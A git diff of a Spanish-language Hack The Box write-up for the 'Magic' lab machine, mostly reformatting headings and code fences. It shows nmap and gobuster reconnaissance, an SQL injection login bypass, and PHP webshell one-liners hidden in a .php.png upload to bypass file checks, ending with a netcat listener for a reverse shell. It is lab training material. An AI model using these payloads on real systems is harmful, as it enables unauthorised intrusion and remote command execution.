@@ -21,15 +21,14 @@ tags:
   <img src="../assets/images/htb-writeup-magic/magic_logo.png">
 </p>
 
-## Introducción:
-
+# Introducción
 
 Magic comienza con una vulnerabilidad clasica de carga insegura de archivos en PHP que nos permite colocar un webshell en el host de destino y luego explotamos una configuración incorrecta del servidor web para ejecutar el webshell (aunque el nombre del archivo no debe terminar con extensión .php). Una vez que aterrizamos un shell, escalamos a otro usuario.  
 
-## Antes de iniciar:
+# Antes de iniciar
 Como es mi primera maquina virtual (box) y soy nuevo con la plataforma de hackthebox, para poder jugar con las maquinas virtuales necesito una conexión con OpenVPN (esta aplicación viene preinstalada en Parrot OS). Esta aplicación permitirá ubicar nuestra host en la misma subred IP que las máquinas vulnerables (boxes), lo que le permitirá contactarlos y atacarlos.
 
-Me ayudé con este video: https://www.youtube.com/watch?v=SmbpScohIFs . Este video muestra como descargar el archivo de configuración automatica de nuestro cliente de OpenVPN e inicializar la conexión con el servidor. El archivo descargado tendra la extensión .ovpn (tickets).
+Me ayudé con este video: [https://www.youtube.com/watch?v=SmbpScohIFs]( https://www.youtube.com/watch?v=SmbpScohIFs ) . Este video muestra como descargar el archivo de configuración automatica de nuestro cliente de OpenVPN e inicializar la conexión con el servidor. El archivo descargado tendra la extensión .ovpn (tickets).
 
 Inicializar la conexión en este comando:
 
@@ -72,7 +71,7 @@ Respuesta:
 
 ```
 
-## Desarrollo de la practica:
+# Desarrollo de la practica
 
 Basado en video de S4vitar on live: [https://www.youtube.com/watch?v=ZJ72UuUlz10]( https://www.youtube.com/watch?v=ZJ72UuUlz10 )  
 
@@ -88,7 +87,7 @@ y creamos los siguientes directorio dentro del él:
 mkdir nmap content exploits
 ```
 
-Fase de reconocimiento:
+## Fase de reconocimiento:
 
 ```go
 cd nmap
@@ -133,7 +132,7 @@ Con el anterior comando estamos diciendo:
 
 Resultado:
 
-```
+```go
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-09 18:30 -05
 Initiating Ping Scan at 18:30
 Scanning 10.10.10.185 [2 ports]
@@ -163,7 +162,7 @@ PORT   STATE SERVICE
 
 Otro comando para hacer nuestro reconocimiento de puertos sería (Más rápido que el anterior):
 
-```
+```go
 nmap -p- -sS --min-rate 5000 -open -vvv -n -Pn -oG allports 10.10.10.185
 
 ```
@@ -176,13 +175,13 @@ Con el anterior comando estamos diciendo:
 - -oG allports → Le decimos que la busqueda realizada la guarde en un archivo grepeable llamado “allports”. [Aqui]( https://www.asyforin.es/kali/herramienta-kali-3-nmap-miscelanea-y-salida-de-datos/ ) puedes encontrar más información sobre el formato grepeable.
 
 
-```
+```go
 cat allports
 ```
 
 obtenemos:
 
-```
+```go
 # Nmap 7.92 scan initiated Tue Dec 14 12:56:22 2021 as: nmap -p- -sS --min-rate 5000 -open -vvv -n -Pn -oG allports 10.10.10.185
 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
 Host: 10.10.10.185 ()	Status: Up
@@ -191,7 +190,7 @@ Host: 10.10.10.185 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
 
 Con esto nos damos cuenta que la máquina tiene abiertos los puertos . Ahora vamos a ver la versión y los servicios que estan corriendo por esos puertos con el siguiente comando:
 
-```
+```go
 nmap -sCV -p22,80 10.10.10.185 -oN targered
 ```
 
@@ -202,7 +201,7 @@ Con el anterior comando estamos diciendo:
 
 Resultado:
 
-```
+```go
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-14 13:46 -05
 Nmap scan report for 10.10.10.185
 Host is up (0.24s latency).
@@ -230,13 +229,13 @@ Ahora intentamos acceder a la página “Magic Portfolio” con la url: [http://
 </p>
 Cada imagen tiene un título con caracteres alfanumericos. Parecen hashes o caracteres hexadecimales. Con la herramienta [xxd](https://francisconi.org/linux/comandos/xxd ) podemos convertir hexadecimal a binario con este comando:
 
-```
+```go
 echo 4d61676963 | xxd -r -p
 ```
 
 Salida:
 
-```
+```go
 Magic
 ```
 
@@ -249,13 +248,13 @@ En este punto podemos buscar en el código fuente de la página a ver si encontr
 </p>
 Buscaremos rutas dentro de nuestra página a ver si encontramos descubrimos alguno. Usaremos gobuster para esto:
 
-```
+```go
 gobuster -h
 ```
 
 Resultado:
 
-```
+```go
 sage:
   gobuster [command]
 
@@ -285,13 +284,13 @@ Use "gobuster [command] --help" for more information about a command.
 
 Con este comando de gobuster empezará el escaneo del sitio web:
 
-```
+```go
 gobuster dir -u http://10.10.10.185/ -w /usr/share/wordlists/dirb/common.txt 
 ```
 
 Resultado:
 
-```
+```go
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -323,13 +322,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 También con otro diccionario de rutas más amplio de dirbuster (220561 rutas) pero se demora mucho más:
 
 
-```
+```go
 gobuster dir -x php -u http://10.10.10.185/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
 Resultado:
 
-```
+```go
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -365,7 +364,7 @@ Regresando a la página principal, vemos en la parte inferior un botón que nos 
 En este login intentaremos hacer una inyección sql con una condición booleana (Aunque no nos deje poner espacios simplemente podemos poner la inyección en el navegador, la copiamos y pegamos en el campo):
 
 
-```
+```go
 ' or 1=1 --
 ```
 
@@ -390,7 +389,7 @@ Por las rutas de las imagenes que ya estan podemos decir que las imagenes son al
 
 Intentaremos subir a nuestra página un archivo de tipo php (esta vulnerabilidad está reportada en [OWASP](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) ), el cual nos permita ejecutar comandos a nivel de sistema (dentro del servidor) a través de la URL. El archivo “prueba.php” es el siguiente:
 
-```
+```php
 <?php
   echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 ?>
@@ -405,11 +404,10 @@ Pero obtenemos que no se admite el formato php, solo 3 tipos de formatos de imag
 </p>
 Tampoco si intentamos subir la imagen con una extensión diferente ([prueba.jpg](prueba.jpg)) pero con el mismo contenido:
 
-```
 <p align="center">
   <img src="../assets/images/htb-writeup-magic/tampoco-se-admite-con-otra-extension.png">
 </p>
-```
+
 Pero podemos intentar subir esta secuencia en php jugando con los magic numbers:
 ## Magic Numbers
 
@@ -426,7 +424,7 @@ Lista de algunos números magicos: [1](https://en.wikipedia.org/wiki/List_of_fil
 <br>
 Se complico un poco subir el archivo modificando los magic numbers manualmente, entonces se puede usar un truco que consisten en pones la extension *.php.png* al archivo, y agregar en alguna parte de este archivo (se encuentra en formato binario) codigo en php. Insertaremos la siguiente linea en el archivo **prueba.php.png** :
 
-```
+```php
 <?php system($_GET['cmd']); ?>
 ```
 
@@ -450,7 +448,7 @@ Probamos la ruta [http://10.10.10.185/images/uploads/pruebaReverseShell2.php.png
 
 De esta forma comprobamos la ejecución de comandos. Ahora intentamos hacer una reverse shell. Para esto primero localmente debemos ponernos en escucha por el puerto 443 usando la herramienta [netcat] (https://blog.desdelinux.net/usando-netcat-algunos-comandos-practicos/?utm_source=twitterfeed&utm_medium=twitter):
 
-```
+```go
 > sudo nc -nlvp 443
 listening on [any] 443 ...
 ```
@@ -463,7 +461,7 @@ Ya tenemos una consola para ejecutar comando en el servidor!!!
 <br>
 Aunque la ejecución de comando no aparece en un buen formato, como estamos acostumbrados:
 
-```
+```go
 www-data@ubuntu:/var/www/Magic/images/uploads$ whoami
 whoami
 www-data
@@ -482,7 +480,7 @@ ll: command not found
 ```
 Para corregir esto hacemos:
 
-```
+```go
 script /dev/null -c bash
 ```
 
